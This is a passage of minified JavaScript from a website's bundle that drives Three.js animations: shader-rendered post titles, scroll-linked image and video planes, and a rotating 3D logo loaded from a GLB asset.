vec4(position,1.0);\n}\n\n"},function(t,e,i){"use strict";i.r(e);var n=i(17),r=i(166),a=i.n(r),o=i(167),s=i.n(o);frontGL.__HOME__={frag:a.a,vert:s.a,__Flag_ok__:!1,once:function(){this.width=window.innerWidth,this.height=window.innerHeight,this.scene=new THREE.Scene,this.camera=new THREE.PerspectiveCamera(90,backGL.width/backGL.height,.1,backGL.height),this.camera.position.z=backGL.height/2,this.scene.add(this.camera),this.stage=new THREE.Group,this.scene.add(this.stage)},texts:[],fontSize:120,anim:{zoom:{origin:{pow:0,deg:0},from:{pow:0,deg:0},to:{pow:1,deg:.05}},offset:{origin:0,from:0,to:1.5},opacity:{origin:0,from:1,to:0}},wheel_power:8,default:{stage:{x:0,y:.5,deg:.25,padding_top:.11,padding_right:.1},title:{radius_vh:12.5,radius_pow:40}},$slides:[],onInit:function(){this.$slides=document.querySelectorAll(".page-title"),styleCounter.onInit(this.$slides.length)},onLoaded:function(){for(var t=0;t<__POSTS__.length;t++){var e=Object(n.a)(__POSTS__[t].post_title_array).join("\n");__FONTS__.fontSize.useVW?this.fontSize=this.width/100*__FONTS__.fontSize.vw*frontGL.scale:this.fontSize=this.height/100*__FONTS__.fontSize.vh*frontGL.scale;var i=new getCanvas(e,"front",this.fontSize,__COL_WHITE__,__FONTS__.fontWeight,__FONTS__.fontFamily,__COL_STROKE_WHITE__);__POSTS__[t].title.fillText={canvas:i,tex:new THREE.Texture(i.canvas)},__POSTS__[t].title.fillText.tex.magFilter=THREE.LinearFilter,__POSTS__[t].title.fillText.tex.minFilter=THREE.LinearFilter;var r=new getCanvas(e,"back",this.fontSize,__COL_WHITE__,__FONTS__.fontWeight,__FONTS__.fontFamily,__COL_STROKE_WHITE__);__POSTS__[t].title.strokeText={canvas:r,tex:new THREE.Texture(r.canvas)},__POSTS__[t].title.strokeText.tex.magFilter=THREE.LinearFilter,__POSTS__[t].title.strokeText.tex.minFilter=THREE.LinearFilter;var a=new THREE.ShaderMaterial({transparent:!0,uniforms:{fillText:{type:"t",value:__POSTS__[t].title.fillText.tex},strokeText:{type:"t",value:__POSTS__[t].title.strokeText.tex},resolution:{type:"v2",value:new THREE.Vector2},right:{value:2},left:{value:3},height:{value:15},offset:{value:{x:0,y:0}},pivot:{value:{x:0,y:0}},opacity:{value:1},hole:{value:1},radius:{value:0},radius_pow:{value:this.default.title.radius_pow}},vertexShader:this.vert,fragmentShader:this.frag}),o=new THREE.PlaneBufferGeometry(1,1,1),s=new THREE.Mesh(o,a);__ENV__.hole?a.uniforms.hole.value=1:a.uniforms.hole.value=0,a.uniforms.radius.value=this.default.title.radius_vh/100*__WH__*frontGL.scale,a.uniforms.resolution.value.x=this.width*frontGL.scale,a.uniforms.resolution.value.y=this.height*frontGL.scale;var l=Math.tan(this.default.stage.deg)*__WW__/__WH__;a.uniforms.right.value=0,a.uniforms.left.value=l,this.stage.add(s),__POSTS__[t].title.mesh=s}this.__Flag_ok__=!0,this.onResize()},copy:{y1:0,y2:0},onResize:function(){this.width=window.innerWidth,this.height=window.innerHeight,this.camera.aspect=backGL.width/backGL.height,this.camera.position.z=backGL.height/2,this.camera.updateProjectionMatrix(),this.mesh_height=__WH__*this.default.stage.y,this.mesh_padding=__WH__*this.default.stage.padding_top,this.total_height=0;for(var t=0,e=0;e<__POSTS__.length;e++)this.total_height+=this.mesh_height+this.mesh_padding,0!=e?(t-=this.mesh_height+this.mesh_padding,__POSTS__[e].title.mesh.position.y=t):t=0,__POSTS__[e].title.pos.py=t;for(this.copy.y1=3*(this.mesh_height+this.mesh_padding),this.copy.y2=__WH__-2*this.copy.y1,this.stage.position.y=this.copy.y1,isMobileFixed.any?this.total_height=this.total_height+this.copy.y2-(this.mesh_height+this.mesh_padding):this.total_height=this.total_height+this.copy.y2,__FONTS__.fontSize.useVW?this.fontSize=this.width/100*__FONTS__.fontSize.vw*frontGL.scale:this.fontSize=this.height/100*__FONTS__.fontSize.vh*frontGL.scale,e=0;e<__POSTS__.length;e++)__POSTS__[e].title.fillText&&(__POSTS__[e].title.mesh.material.uniforms.resolution.value.x=this.width*frontGL.scale,__POSTS__[e].title.mesh.material.uniforms.resolution.value.y=this.height*frontGL.scale,__POSTS__[e].title.fillText.fontSize=this.fontSize,__POSTS__[e].title.fillText.tex.needsUpdate=!0,__POSTS__[e].title.fillText.canvas.draw(),__POSTS__[e].title.fillText.tex.needsUpdate=!1,__POSTS__[e].title.strokeText.fontSize=this.fontSize,__POSTS__[e].title.strokeText.tex.needsUpdate=!0,__POSTS__[e].title.strokeText.canvas.draw(),__POSTS__[e].title.strokeText.tex.needsUpdate=!1)},onUpdate:function(){var t=(1-backGL.__HOME__.zoom.pow)*(1-Math.abs(frontGL.__LOGO__.anim.power));__ENV__.mouse?(this.stage.position.x=t*(mouse.ax*mouse.front.x*__WW__),this.stage.position.y=t*(-mouse.ay*mouse.front.y*__WH__)+this.copy.y1,this.stage.rotation.y=mouse.ax*mouse.front.deg):this.stage.position.y=this.copy.y1,this.stage.position.z=-Math.abs(fakeWheel.speed.pow1*__WH__*.25)*t;for(var e=0;e<__POSTS__.length;e++){var i=__POSTS__[e];if(i.title.fillText){i.title.pos.y=i.title.pos.py+fakeScroll.body.py*(this.total_height-__WH__),backGL.__HOME__.zoom.enable&&(i.title.pos.y=i.title.pos.py+backGL.__HOME__.slideTo.py*(this.total_height-__WH__));var n=i.title.pos.y+this.copy.y1+.5*__WH__+this.mesh_height/2+this.mesh_padding/2,r=n-__WH__-this.mesh_padding/2-this.mesh_height-this.mesh_padding/2;if(loading.__Flag_after__&&loading.__Flag_font_loaded__)if(n>0&&r<0){var a=i.title.fillText.canvas.width/frontGL.scale,o=i.title.fillText.canvas.height/frontGL.scale;i.title.mesh.scale.set(a,o,1);var s=__WW__/2-a/2-__WW__*this.default.stage.padding_right;i.title.mesh.material.uniforms.pivot.value.x=this.width*frontGL.scale*mouse.fx,i.title.mesh.material.uniforms.pivot.value.y=this.height*frontGL.scale*mouse.fy;var l=Math.max(Math.abs(fakeWheel.speed.pow1*(this.default.title.radius_vh/100)*__WH__),0)*this.wheel_power;if(i.title.mesh.material.uniforms.radius.value=(this.default.title.radius_vh/100*__WH__-l)*frontGL.scale*(1-this.anim.zoom.origin.pow),i.title.mesh.material.uniforms.radius_pow.value=(this.default.title.radius_pow-l*this.default.title.radius_pow/(this.default.title.radius_vh/100*__WH__))*(1-this.anim.zoom.origin.pow),i.title.mesh.material.visible=!0,isMobileFixed.any&&i.is_clone&&(i.title.mesh.material.visible=!1),i.title.mesh.material.visible){var c=(i.title.pos.y+this.copy.y1)/__WH__,h=Math.abs((1-c*c)*fakeWheel.speed.pow1*__WW__*.25);i.title.mesh.rotation.z=c*this.default.stage.deg+this.anim.zoom.origin.deg,i.title.mesh.position.x=h+s-Math.abs(Math.sin(c*c*this.default.stage.deg*.5)*(this.mesh_padding+this.mesh_height)),i.title.mesh.position.y=i.title.pos.y}}else i.title.mesh.material.visible=!1;else i.title.mesh.material.visible=!1}}if(timestep%8==0&&(styleCounter.onCount(backGL.__HOME__.center.index-2),this.$slides.length))for(e=0;e<this.$slides.length;e++)parseInt(this.$slides[e].dataset.id)===backGL.__HOME__.center.post_id?this.$slides[e].classList.add("_active"):this.$slides[e].classList.remove("_active")},onScroll:function(){},onZoomIn:function(t,e){var i=this;__POSTS__.forEach((function(n,r){var a=n.title.mesh;a&&(n.selected?(TweenLite.to(a.material.uniforms.offset.value,t,{y:i.anim.offset.to,ease:e}),TweenLite.to(i.anim.zoom.origin,t,{deg:i.anim.zoom.to.deg,ease:e}),__ENV__.hole&&TweenLite.to(i.anim.zoom.origin,t/2,{pow:i.anim.zoom.to.pow,ease:e})):TweenLite.to(a.material.uniforms.opacity,t,{value:i.anim.opacity.to,ease:e}))}))},onZoomOut:function(t,e){var i=this;__POSTS__.forEach((function(n,r){var a=n.title.mesh;a&&(a.material.uniforms.opacity.value=i.anim.opacity.from,a.material.uniforms.offset.value.y=-1*i.anim.offset.to,TweenLite.to(a.material.uniforms.offset.value,t,{y:i.anim.offset.from,ease:e}),TweenLite.to(i.anim.zoom.origin,t,{deg:i.anim.zoom.from.deg,ease:e}),__ENV__.hole&&TweenLite.to(i.anim.zoom.origin,t/2,{pow:i.anim.zoom.from.pow,ease:e}))}))}}},function(t,e,i){"use strict";i.r(e),i(25);var n=i(17),r=i(168),a=i.n(r),o=i(169),s=i.n(o),l=i(170),c=i.n(l),h=i(171),u=i.n(h);frontGL.__CONTENTS__={__Flag_ok__:!1,planes:[],stacks:{mesh:[],index:0,total:0,depth:0,depth_max:80,deg:.15},title:{fontSize:0,array:[],align:null,fillText:null,strokeText:null,mesh:null,w:0,h:0,padding_right:.1,padding_bottom:.2,translate:{x:.5,y:.5}},once:function(){this.width=window.innerWidth,this.height=window.innerHeight,this.scene=new THREE.Scene,this.camera=new THREE.PerspectiveCamera(90,this.width/this.height,.1,this.height),this.camera.position.z=this.height/2,this.scene.add(this.camera),this.stage=new THREE.Group,this.scene.add(this.stage),this.stage_title=new THREE.Group,this.scene.add(this.stage_title)},onDestroy:function(){var t=this;if(this.planes.length&&this.planes.forEach((function(e,i){var n=e.mesh;n.material.dispose(),n.geometry.dispose(),t.stage.remove(n),e.tex&&(e.tex.dispose(),e.tex=null),n.material=null,n.geometry=null,e.mesh=null})),this.planes=[],this.stacks.mesh.length)for(var e=0;e<this.stacks.mesh.length;e++){var i=this.stacks.mesh[e];i.material&&i.material.dispose(),i.geometry&&i.geometry.dispose(),t.stage.remove(i),this.stacks.mesh[e]=null}if(this.stacks.mesh=[],this.stacks.index=0,this.stacks.total=0,"reel"===__PAGE_TYPE__&&(this.title.array=[]),this.stage_title.children.length)for(e=0;e<this.stage_title.children.length;e++)this.stage_title.children[e]&&(this.stage_title.children[e].material.dispose(),this.stage_title.children[e].geometry.dispose(),this.stage_title.remove(this.stage_title.children[e])),this.title.fillText&&(this.title.fillText.tex.dispose(),this.title.fillText.tex=null,this.title.fillText.canvas=null,this.title.fillText=null),this.title.strokeText&&(this.title.strokeText.tex.dispose(),this.title.strokeText.tex=null,this.title.strokeText.canvas=null,this.title.strokeText=null)},onLoadTitlesBefore:function(t,e){if(__LEGACY__)return!1;this.title.array=t,this.title.align=e,this.title.mesh=null,this.title.fillText=null,this.title.w=0,this.title.h=0},onLoadedFonts:function(){},onLoadTitlesAfter:function(){if(__LEGACY__)return!1;__FONTS__.fontSize.useVW?this.title.fontSize=this.width/100*__FONTS__.fontSize.vw*frontGL.scale:this.title.fontSize=this.height/100*__FONTS__.fontSize.vh*frontGL.scale;var t=Object(n.a)(this.title.array).join("\n"),e=new getCanvas(t,"front",this.title.fontSize,__COL_WHITE__,__FONTS__.fontWeight,__FONTS__.fontFamily,__COL_STROKE_WHITE__);this.title.fillText={canvas:e,tex:new THREE.Texture(e.canvas)},this.title.fillText.tex.needsUpdate=!0,this.title.fillText.tex.magFilter=THREE.LinearFilter,this.title.fillText.tex.minFilter=THREE.LinearFilter;var i=new THREE.ShaderMaterial({transparent:!0,uniforms:{fillText:{type:"t",value:this.title.fillText.tex},offset:{value:{x:0,y:-1.5}}},vertexShader:u.a,fragmentShader:c.a}),r=new THREE.PlaneBufferGeometry(1,1,1);this.title.mesh=new THREE.Mesh(r,i),this.title.w=this.title.fillText.canvas.width/frontGL.scale,this.title.h=this.title.fillText.canvas.height/frontGL.scale,r.translate(.5,-.5,0),this.stage_title.add(this.title.mesh),frontGL.__CONTENTS__.onFlipIn(routeTransition.anim.tr.in.s,routeTransition.anim.tr.in.e)},onFlipOut:function(t,e){this.title.mesh&&(TweenLite.to(this.title.mesh.material.uniforms.offset.value,t,{y:frontGL.__HOME__.anim.offset.to,ease:e}),TweenLite.to(this.title.mesh.rotation,2*t,{z:frontGL.__HOME__.anim.zoom.to.deg,ease:e}))},onFlipIn:function(t,e){this.title.mesh&&(this.title.mesh.material.uniforms.offset.value.y=-1*frontGL.__HOME__.anim.offset.to,TweenLite.to(this.title.mesh.material.uniforms.offset.value,t,{y:frontGL.__HOME__.anim.offset.from,ease:e}),this.title.mesh.rotation.z=-1*frontGL.__HOME__.anim.zoom.to.deg,TweenLite.to(this.title.mesh.rotation,2*t,{z:0,ease:e}))},onLoadContents:function(){var t=this,e=0;pageBodyScroll.sections.length&&pageBodyScroll.sections.forEach((function(i,n){if(i.status){"stack"===i.status.layout&&0===t.stacks.index&&(t.stacks.index=e);var r=new THREE.PlaneBufferGeometry(1,1,1),o=new THREE.ShaderMaterial({transparent:!0,visible:!1,uniforms:{tDiffuse:{type:"t",value:null},offsetX:{type:"f",value:0},offsetY:{type:"f",value:0},scaleX:{type:"f",value:1.1},scaleY:{type:"f",value:1.1},rgb:{type:"f",value:0},rgb_shift:{value:0},opacity:{type:"f",value:0},alpha:{type:"f",value:1},resolution:{type:"v2",value:{x:0,y:0}},rect:{type:"v2",value:{x:0,y:0}},gradient:{type:"f",value:0},is_fullscreen:{type:"f",value:0},is_win:{type:"f",value:__WIN__},wheel_power:{type:"f",value:0},scroll_power:{type:"f",value:0}},vertexShader:s.a,fragmentShader:a.a}),l=new THREE.Mesh(r,o);l.scale.set(i.rw,i.rh,1),l.index=n,l.layout=i.status.layout,l.type=i.status.type,t.planes.push({index:n,mesh:l,el:null,tex:null,once:!1,hover:!1,uid:i.status.uid,cx:0,cy:0,layout:i.status.layout}),o.uniforms.resolution.value.x=i.rw*frontGL.scale,o.uniforms.resolution.value.y=i.rh*frontGL.scale,o.uniforms.rect.value.x=i.status.w,o.uniforms.rect.value.y=i.status.h,"fullscreen"!==i.status.layout&&"iframe"!==i.status.layout||(o.uniforms.is_fullscreen.value=1),"stack"===i.status.layout&&t.stacks.mesh.push(l),"works"===i.status.layout&&(o.uniforms.scaleX.value=pageWorks.anim.scale.from,o.uniforms.scaleY.value=pageWorks.anim.scale.from,o.uniforms.alpha.value=__RGB__.works.opacity,o.uniforms.rgb.value=__RGB__.works.rgb),"reel"===i.status.layout&&(o.uniforms.scaleX.value=1,o.uniforms.scaleY.value=1),"mobile"===i.status.layout&&(o.uniforms.scaleX.value=1,o.uniforms.scaleY.value=1,l.rotation.x=-.05),"tablet"===i.status.layout&&(o.uniforms.scaleX.value=1,o.uniforms.scaleY.value=1,l.rotation.x=-.05),t.stage.add(l),e++}})),this.scene.add(this.stage),this.stacks.total=this.stacks.mesh.length-1,this.stacks.depth=18,this.title.array&&!isMobileFixed.any&&this.onLoadTitlesAfter(),this.__Flag_ok__=!0,this.onResize()},onUpdate:function(){if(this.title.fillText&&fakeScroll.body.y<__WH__)switch(this.title.w=this.title.fillText.canvas.width/frontGL.scale,this.title.h=this.title.fillText.canvas.height/frontGL.scale,this.title.mesh.scale.x=this.title.w,this.title.mesh.scale.y=this.title.h,this.title.align){case"center":this.title.mesh.position.x=-this.title.w/2,this.title.mesh.position.y=1.2*fakeScroll.body.y+this.title.h/2;break;default:var t=this.width/2-this.title.w/2-this.width*this.title.padding_right-this.title.w/2,e=-this.height/2+this.title.h/2+this.height*this.title.padding_bottom+this.title.h/2;this.title.mesh.position.x=t,this.title.mesh.position.y=e+1.2*fakeScroll.body.y}this.planes.length&&(this.onUpdateRepeat(),this.onUpdateOnce())},is_video_playing:0,onUpdateRepeat:function(){for(var t=[],e=this.planes.length-1;e>=0;e--){var i=this.planes[e],n=i.index,r=pageBodyScroll.sections[n],a=r.visible,o=i.mesh,s=o.layout,l=o.type,c=void 0;if(i.cy=1e3,1===a){switch(i.cy=o.position.y/__WH__,o.material.visible=!0,isMobileFixed.any||(o.material.uniforms.wheel_power.value=.5*Math.abs(fakeWheel.speed.pow1),o.material.uniforms.rgb_shift.value=fakeScroll.speed.pow2*(1/r.rh)*200),s){case"works":o.material.uniforms.offsetY.value=i.cy*__WH__/r.rh*.03,o.position.y=-r.ry+fakeScroll.body.y+(__WH__/2-r.rh/2);break;case"normal":o.material.uniforms.offsetY.value=.1*i.cy+.025,o.position.y=-r.ry+fakeScroll.body.y+(__WH__/2-r.rh/2);break;case"looper":c=r.el.getBoundingClientRect(),i.cx=o.position.x/__WW__,r.rx=c.left,r.rw=c.width,o.material.uniforms.offsetX.value=.1*i.cx,o.material.uniforms.offsetY.value=.1*i.cy+.025,o.position.y=-r.ry+fakeScroll.body.y+(__WH__/2-r.rh/2),o.position.x=r.rx-__WW__/2+r.rw/2;break;case"slide":c=r.el.getBoundingClientRect(),i.cx=o.position.x/__WW__,r.rx=c.left,r.rw=c.width,o.material.uniforms.offsetX.value=.1*i.cx,o.material.uniforms.offsetY.value=.1*i.cy+.025,o.position.x=r.rx-__WW__/2+r.rw/2,o.position.y=-r.ry+fakeScroll.body.y+(__WH__/2-r.rh/2);break;case"fullscreen":case"iframe":"404"===__PAGE_TYPE__?(o.material.uniforms.scaleX.value=.1,o.material.uniforms.scaleY.value=.1,o.material.uniforms.offsetX.value=.125*mouse.ax,o.material.uniforms.offsetY.value=.125*-mouse.ay):o.material.uniforms.offsetY.value=.1*i.cy+.025,o.position.y=-r.ry+fakeScroll.body.y+(__WH__/2-r.rh/2);break;case"tablet":case"mobile":default:o.position.y=-r.ry+fakeScroll.body.y+(__WH__/2-r.rh/2)}"video"===l&&i.el&&"reel"!=s&&t.push(Math.abs(i.cy))}else"video"===l&&i.el&&i.el.pause(),o.material.visible=!1}var h=Math.min.apply(Math,t);for(this.is_video_playing=0,e=this.planes.length-1;e>=0;e--){var u=this.planes[e],d=u.mesh,p=d.layout,f=d.type;"works"!=p&&"video"===f&&u.el&&(h===Math.abs(u.cy)?(onPlayVideo(u.el),this.is_video_playing=1):"reel"!=p&&u.el.pause())}},pass:!1,onUpdateOnce:function(){var t=this;this.planes.forEach((function(e,i){var n=e.index,r=pageBodyScroll.sections[n],a=e.mesh,o=r.visible,s=a.layout,l=a.type;if(e.once||1!=o)return!1;switch(e.once=!0,a.position.x=r.rx-__WW__/2+r.rw/2,l){case"video":a.material&&(TweenLite.to(a.material.uniforms.gradient,1.3,{value:1,ease:Power2.easeOut}),e.el=r.el.querySelectorAll(".source")[0],e.tex=new THREE.VideoTexture(e.el),e.tex.needsUpdate=!0,e.tex.minFilter=THREE.LinearFilter,a.material.uniforms.tDiffuse.value=e.tex,"404"===__PAGE_TYPE__?(TweenLite.to(a.material.uniforms.opacity,1,{value:.5}),TweenLite.to(a.material.uniforms.rgb,1,{value:.01})):TweenLite.to(a.material.uniforms.opacity,1,{value:1}));break;case"img":e.el=r.el.querySelectorAll(".source")[0],TweenLite.to(a.material.uniforms.gradient,1,{value:1,ease:Power2.easeOut}),e.el.onload=function(n){if(e.tex=new THREE.Texture(this),e.tex.needsUpdate=!0,e.tex.minFilter=THREE.LinearFilter,a.material&&a.material.uniforms)if(a.material.uniforms.tDiffuse.value=e.tex,"stack"===s){var r=.2*(i-t.stacks.index);TweenLite.to(a.material.uniforms.opacity,1,{value:1}),a.position.z=1.6*t.stacks.depth_max+i,TweenLite.to(a.position,1,{z:(i-t.stacks.index)*t.stacks.depth,delay:r,ease:Power2.easeInOut}),TweenLite.to(a.rotation,1,{z:-(i-t.stacks.index)*t.stacks.deg+.5*t.stacks.total*t.stacks.deg,delay:r,ease:Power2.easeInOut})}else"mobile"===s||"tablet"===s?(a.position.z=80,TweenLite.to(a.position,1.3,{z:0,ease:Power2.easeOut}),TweenLite.to(a.material.uniforms.opacity,1,{value:1})):"works"===s?(isMobileFixed.any||(a.position.z=80,TweenLite.to(a.position,1,{z:0})),TweenLite.to(a.material.uniforms.opacity,1,{value:1})):(isMobileFixed.any||(a.position.z=80,TweenLite.to(a.position,1.3,{z:0,ease:Power2.easeOut})),TweenLite.to(a.material.uniforms.opacity,1,{value:1}))},e.el.src=getImageSrc(r.status.src1x,r.status.src2x)}}))},onResize:function(){if(this.camera.aspect=this.width/this.height,this.camera.position.z=this.height/2,this.camera.far=this.height,this.camera.updateProjectionMatrix(),this.width=window.innerWidth,this.height=window.innerHeight,this.planes.length)for(var t=0;t<this.planes.length;t++){var e=pageBodyScroll.sections[this.planes[t].index],i=this.planes[t].mesh,n=e.status.layout;i.position.x=e.rx-__WW__/2+e.rw/2,"fullscreen"===n||"iframe"===n?(i.material.uniforms.resolution.value.x=e.rw*frontGL.scale,i.material.uniforms.resolution.value.y=e.rh*frontGL.scale,i.scale.set(e.rw,e.rh,1)):(i.material.uniforms.resolution.value.x=__WW__*frontGL.scale,i.material.uniforms.resolution.value.y=__WH__*frontGL.scale,i.scale.set(e.rw,e.rh,1))}this.title.fillText&&(__FONTS__.fontSize.useVW?this.title.fontSize=this.width/100*__FONTS__.fontSize.vw*frontGL.scale:this.title.fontSize=this.height/100*__FONTS__.fontSize.vh*frontGL.scale,"works"===__PAGE_TYPE__?this.title.fillText.canvas.fontSize=1.2*this.title.fontSize:this.title.fillText.canvas.fontSize=this.title.fontSize,this.title.fillText.tex.needsUpdate=!0,this.title.fillText.canvas.draw())},onLoadIframe:function(t){for(var e=t.dataset.iframe,i=t.nextElementSibling,n=getParents(t,"iframe-fullscreen-body"),r=Number(n.dataset.index),a=0;a<this.planes.length;a++)if(r===this.planes[a].index){var o=this.planes[a].mesh;o&&TweenLite.to(o.material.uniforms.opacity,1,{value:0})}i.innerHTML=e,n.classList.add("iframe-loaded")},onFadeOut:function(t){var e=this;this.planes.length&&this.planes.forEach((function(i,n){var r=i.index,a=(pageBodyScroll.sections[r].visible,i.mesh);a.layout,a.type,0===n?TweenLite.to(a.material.uniforms.opacity,t,{value:0,onComplete:function(){e.onFadeOutComplete()}}):TweenLite.to(a.material.uniforms.opacity,t,{value:0})}))},onFadeOutComplete:function(){this.onDestroy()}}},function(t,e,i){"use strict";i.r(e);var n=i(172),r=i.n(n),a=i(173),o=i.n(a),s=i(54);frontGL.__LOGO__={scale:{s:6,l:42},origin:{pow:0,opacity:1,rotation:{x:0,y:0},head:{pos:{x:0,y:0,z:0},offset:{x:0,y:0},scale:{x:0,y:0,z:0},rgb:__COL_M__/255}},transform:{contact:{pow:1,opacity:1,rotation:{x:0,y:0},head:{offset:{x:0,y:0},pos:{x:0,y:.05,z:0},scale:{x:0,y:0,z:0},rgb:__COL_W__/255}},404:{pow:1,opacity:1,rotation:{x:0,y:0},head:{offset:{x:0,y:0},pos:{x:0,y:.05,z:0},scale:{x:0,y:0,z:0},rgb:__COL_W__/255}},about:{pow:1,opacity:1,rotation:{x:0,y:0},head:{offset:{x:0,y:0},pos:{x:0,y:.05,z:0},scale:{x:0,y:0,z:0},rgb:__COL_W__/255}},hover:{pow:0,opacity:1,rotation:{x:0,y:0},head:{offset:{x:0,y:0},pos:{x:0,y:.4,z:0},scale:{x:0,y:0,z:0},rgb:__COL_W__/255}},normal:{pow:0,opacity:1,rotation:{x:0,y:0},head:{pos:{x:0,y:.4,z:0},offset:{x:0,y:0},scale:{x:0,y:0,z:0},rgb:__COL_W__/255}},zoom_before_normal:{pow:0,opacity:0,rotation:{x:0,y:0},head:{pos:{x:0,y:.4,z:0},offset:{x:0,y:0},scale:{x:0,y:0,z:0},rgb:__COL_B__/255}},zoom_before_pages:{pow:1,opacity:0,rotation:{x:0,y:0},head:{offset:{x:0,y:0},pos:{x:0,y:.05,z:0},scale:{x:0,y:0,z:0},rgb:__COL_B__/255}}},__Flag_ok__:!0,head:{obj:null,mesh:null,src:"https://rebel-sam.s3.eu-west-2.amazonaws.com/gz-logo.glb",pow:0,pos:{x:[],y:[],z:[],origin:[],scaled:[],max:{x:0,y:0,z:0}}},label:{mesh:null,src:"assets/img/label.png",tex:null},bg:{mesh:null,px:85},anim:{twist:0,twistTween:null,power:0,s:1,e:Power2.easeOut,touch:{x:0,y:0},position:{x:0,y:0,s:1,e:Power2.easeOut},rotation:{x:0,y:0,z:0,in:{s:1,e:Power2.easeOut},out:{s:1.5,e:Power2.easeOut}},transform:{s:1,e:Power2.easeOut},mouse:{s:1,ax:0,ay:0}},fbo:null,once:function(){this.width=window.innerWidth,this.height=window.innerHeight,this.scene=new THREE.Scene,this.aspect=this.width/this.height,this.camera=new THREE.OrthographicCamera(-this.height*this.aspect/2,this.height*this.aspect/2,this.height/2,-this.height/2,-600,600),this.camera.position.z=200,this.scene.add(this.camera),this.stage=new THREE.Group,this.scene.add(this.stage)},onLoadAssets:function(){var t=this;new THREE.GLTFLoader(loading.contents).load(this.head.src+__QUERY__,(function(e){var i=e.scene.children[0];t.head.obj=i}))},onLoaded:function(){var t=new THREE.ShaderMaterial({transparent:!0,visible:!0,uniforms:{rgb:{type:"f",value:__COL_W__/255},a:{type:"f",value:1},twistTime:{type:"f",value:0},twistHeight:{type:"f",value:1},twistAngleDegMax:{type:"f",value:15}},vertexShader:o.a,fragmentShader:r.a}),e=this.head.obj.geometry;this.head.mesh=new THREE.Mesh(e,t),this.head.mesh.scale.set(24,24,24),this.head.mesh.updateMatrix(),this.head.mesh.geometry.applyMatrix(this.head.mesh.matrix),this.head.mesh.matrix.identity(),this.head.mesh.position.z=0,this.scene.add(this.head.mesh),this.onResize(),this.__Flag_ok__=!0},now:null,onInit:function(){this.now=this.transform[__PAGE_TYPE__],this.now||(this.now=this.transform.normal),"home"===__PAGE_TYPE__?TweenLite.to(this.anim.position,this.anim.position.s,{y:0,ease:this.anim.position.e}):TweenLite.to(this.anim.position,this.anim.position.s,{y:1,ease:this.anim.position.e})},onSplashBefore:function(){var t=this.transform[__PAGE_TYPE__];t||(t=this.transform.normal),this.now=t,"about"===__PAGE_TYPE__||"contact"===__PAGE_TYPE__||"404"===__PAGE_TYPE__?(this.origin.head.pos.y=.05*__WH__,this.origin.head.scale.x=1.025*this.transform.about.head.scale.x,this.origin.head.scale.y=1.025*this.transform.about.head.scale.y,this.origin.head.scale.z=1.025*this.transform.about.head.scale.z):(this.origin.head.pos.y=.55*__WH__,this.origin.head.scale.x=1.2*this.transform.normal.head.scale.x,this.origin.head.scale.y=1.2*this.transform.normal.head.scale.y,this.origin.head.scale.z=1.2*this.transform.normal.head.scale.z)},onUpdate:function(){if(!this.head.mesh)return!1;var t=this.origin.pow*mouse.ay*.5,e=this.origin.pow*mouse.ax*.5,i=(1-this.origin.pow)*(.25*this.anim.mouse.ay*this.anim.power),n=(1-this.origin.pow)*(.5*this.anim.mouse.ax*this.anim.power),r=t+i+this.origin.rotation.x*(Math.PI/180)+loading.anim.rotation.x,a=e+n+this.origin.rotation.y*(Math.PI/180)+loading.anim.rotation.y,o=this.origin.pow*fakeScroll.body.y*1.1+(1-this.origin.pow)*fakeScroll.body.y*this.anim.position.y;"home"===__PAGE_TYPE__&&(o=0);var s=this.origin.pow*mouse.ax*__WW__*.05,l=this.origin.pow*mouse.ay*__WH__*-.05,c=(1-this.origin.pow)*(5*this.anim.mouse.ax),h=(1-this.origin.pow)*(-5*this.anim.mouse.ay),u=this.origin.head.pos.x+s+c,d=this.origin.head.pos.y+l+h+o;this.head.mesh.rotation.x=r+(1-this.origin.pow)*this.anim.rotation.x,this.head.mesh.rotation.y=a+(1-this.origin.pow)*this.anim.rotation.y,this.head.mesh.position.x=u,this.head.mesh.position.y=d,this.head.mesh.position.z=this.origin.head.pos.z,this.head.mesh.scale.x=this.origin.head.scale.x*loading.anim.scale,this.head.mesh.scale.y=this.origin.head.scale.y*loading.anim.scale,this.head.mesh.scale.z=this.origin.head.scale.z*loading.anim.scale,this.head.mesh.material.uniforms.a.value=this.origin.opacity,this.head.mesh.material.uniforms.rgb.value=this.origin.head.rgb,this.head.mesh.material.uniforms.twistTime.value=this.anim.twist,this.bg.mesh&&(this.bg.mesh.position.x=u,this.bg.mesh.position.y=d)},onMouseLoEnter:function(){TweenLite.to(this.head,1,{pow:1})},onUpdateForMobile:function(){if(!this.head.mesh)return!1;var t=this.origin.head.pos.x,e=this.origin.head.pos.y,i=this.origin.pow*fakeScroll.body.y*1.1+(1-this.origin.pow)*fakeScroll.body.y*this.anim.position.y;"home"===__PAGE_TYPE__&&(i=0),this.head.mesh.rotation.x=30*styleMenu.anim.pow*(Math.PI/180),this.head.mesh.rotation.y=-30*styleMenu.anim.pow*(Math.PI/180),this.head.mesh.position.x=t,this.head.mesh.position.y=e+i,this.head.mesh.scale.x=this.origin.head.scale.x,this.head.mesh.scale.y=this.origin.head.scale.y,this.head.mesh.scale.z=this.origin.head.scale.z,this.head.mesh.material.uniforms.a.value=this.origin.opacity,this.head.mesh.material.uniforms.rgb.value=this.origin.head.rgb,this.bg.mesh&&(this.bg.mesh.position.x=t,this.bg.mesh.position.y=e)},colorChange:function(t){},onResize:function(){this.width=window.innerWidth,this.height=window.innerHeight,this.camera.left=-this.width/2,this.camera.right=this.width/2,this.camera.top=this.height/2,this.camera.bottom=-this.height/2,this.camera.updateProjectionMatrix();var t=__WH__/1050;__WW__,this.transform.normal.head.scale.x=this.scale.s*t,this.transform.normal.head.scale.y=this.scale.s*t,this.transform.normal.head.scale.z=this.scale.s*t,this.transform.hover.head.scale.x=1.2*this.scale.s*t,this.transform.hover.head.scale.y=1.2*this.scale.s*t,this.transform.hover.head.scale.z=1.2*this.scale.s*t,this.transform.contact.head.scale.x=this.transform[404].head.scale.x=this.transform.about.head.scale.x=this.scale.l*t,this.transform.contact.head.scale.y=this.transform[404].head.scale.y=this.transform.about.head.scale.y=this.scale.l*t,this.transform.contact.head.scale.z=this.transform[404].head.scale.z=this.transform.about.head.scale.z=this.scale.l*t,this.transform.zoom_before_normal.head.scale.x=1.2*this.transform.normal.head.scale.x,this.transform.zoom_before_normal.head.scale.y=1.2*this.transform.normal.head.scale.y,this.transform.zoom_before_normal.head.scale.z=1.2*this.transform.normal.head.scale.z,this.transform.zoom_before_pages.head.scale.x=1.2*this.transform.about.head.scale.x,this.transform.zoom_before_pages.head.scale.y=1.2*this.transform.about.head.scale.y,this.transform.zoom_before_pages.head.s